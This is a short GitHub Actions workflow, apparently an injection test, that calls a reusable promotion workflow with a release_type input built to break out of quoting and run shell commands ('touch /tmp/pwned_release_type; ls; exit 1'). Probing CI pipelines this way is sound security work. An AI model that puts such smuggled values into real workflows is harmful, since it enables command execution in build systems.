name: argus-call-21
on:
  workflow_dispatch:
jobs:
  call:
    uses: ./.github/workflows/promote.yaml
    with:
      release_type: "x\"; touch /tmp/pwned_release_type; ls; exit 1; #"
      wheel_names: "x"
